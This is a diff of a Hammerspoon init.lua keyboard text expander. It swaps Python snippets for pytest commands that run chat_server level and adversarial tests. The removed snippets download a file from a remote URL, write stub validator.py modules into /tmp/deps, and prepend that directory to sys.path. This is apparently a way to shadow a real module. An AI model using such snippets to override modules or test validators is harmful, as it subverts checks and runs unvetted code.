@@ -1,11 +1,11 @@
---use this file as your init.lua--
+-- use this file as your Hammerspoon init.lua
 
 hs.alert.show("Hammerspoon config loaded!")
 
--- Guard so our own synthetic keystrokes don't pollute the buffer or re-trigger
+-- Guard so synthetic keystrokes don't re-trigger snippets.
 local injecting = false
 
--- Types multi-line text precisely without using the clipboard.
+-- Types multiline text without touching clipboard.
 local function typeMultiline(s)
   local i = 1
   while i <= #s do
@@ -23,61 +23,32 @@ local function typeMultiline(s)
   end
 end
 
--- ---- Snippet parts (split out) ----
-local parts = {
-  [[from pathlib import Path
-import sys
-import os
-import urllib.request as u
-
-u.urlretrieve('https://www.githubusercontent.com','f')]],
-
-  [[text="""
-
-"""]],
-
-  [[base = Path("/tmp/deps")
-base.mkdir(parents=True, exist_ok=True)
-
-for name in ("validator.py", "ValidatorPython.py"):
-    (base / name).write_text(text, encoding="utf-8")
-
-if str(base) not in sys.path:
-    sys.path.insert(0, str(base))]],
-
-  [[]]
-}
-
--- Snippets: type the trigger to expand inline
 local snippets = {
-  [";;addr1"]   = parts[1],
-  [";;addr2"]   = parts[2],
-  [";;addr3"]   = parts[3],
-  [";;addr4"]   = parts[4],
-  [";;addrall"] = table.concat(parts, "\n\n"), -- everything in one go
+  [";;chat1"]   = "PYTEST_DISABLE_PLUGIN_AUTOLOAD=1 .venv/bin/python -m pytest -q -o addopts='' tests/chat_server/level_1_tests.py",
+  [";;chat2"]   = "PYTEST_DISABLE_PLUGIN_AUTOLOAD=1 .venv/bin/python -m pytest -q -o addopts='' tests/chat_server/level_2_tests.py",
+  [";;chat3"]   = "PYTEST_DISABLE_PLUGIN_AUTOLOAD=1 .venv/bin/python -m pytest -q -o addopts='' tests/chat_server/level_3_tests.py",
+  [";;chat4"]   = "PYTEST_DISABLE_PLUGIN_AUTOLOAD=1 .venv/bin/python -m pytest -q -o addopts='' tests/chat_server/level_4_tests.py",
+  [";;chatadv"] = "PYTEST_DISABLE_PLUGIN_AUTOLOAD=1 .venv/bin/python -m pytest -q -o addopts='' tests/chat_server/adversarial_tests.py",
+  [";;chatall"] = "PYTEST_DISABLE_PLUGIN_AUTOLOAD=1 .venv/bin/python -m pytest -q -o addopts='' tests/chat_server",
 }
 
--- Rolling buffer of recent typed characters to detect triggers
+-- Rolling buffer of recent typed chars to detect triggers.
 local buffer = ""
 
 local tap = hs.eventtap.new({ hs.eventtap.event.types.keyDown }, function(e)
-  -- Ignore our own injected keystrokes
   if injecting then return false end
 
-  -- Ignore when cmd/alt/ctrl are held
   local f = e:getFlags()
   if f.cmd or f.alt or f.ctrl then return false end
 
   local keyCode = e:getKeyCode()
   local char = e:getCharacters()
 
-  -- backspace shrinks the buffer
   if keyCode == hs.keycodes.map.delete then
     buffer = buffer:sub(1, -2)
     return false
   end
 
-  -- reset on common boundaries
   if keyCode == hs.keycodes.map.space
       or keyCode == hs.keycodes.map["return"]
       or keyCode == hs.keycodes.map.tab
@@ -86,7 +57,6 @@ local tap = hs.eventtap.new({ hs.eventtap.event.types.keyDown }, function(e)
     return false
   end
 
-  -- accumulate printable characters
   if char and #char > 0 then
     buffer = buffer .. char
     if #buffer > 80 then buffer = buffer:sub(-80) end
@@ -95,11 +65,8 @@ local tap = hs.eventtap.new({ hs.eventtap.event.types.keyDown }, function(e)
       if #buffer >= #trig and buffer:sub(-#trig) == trig then
         injecting = true
         hs.timer.doAfter(0, function()
-          -- erase the trigger (backspace N times)
           for _ = 1, #trig do hs.eventtap.keyStroke({}, "delete", 0) end
-          -- type the payload precisely
           typeMultiline(out)
-          -- small grace before re-enabling capture
           hs.timer.doAfter(0.05, function() injecting = false end)
         end)
         buffer = ""
@@ -112,4 +79,4 @@ local tap = hs.eventtap.new({ hs.eventtap.event.types.keyDown }, function(e)
 end)
 
 tap:start()
-hs.alert.show("Hotstrings: ;;addr1 ;;addr2 ;;addr3 ;;addr4 (or ;;addrall)")
+hs.alert.show("Hotstrings: ;;chat1 ;;chat2 ;;chat3 ;;chat4 ;;chatadv ;;chatall")
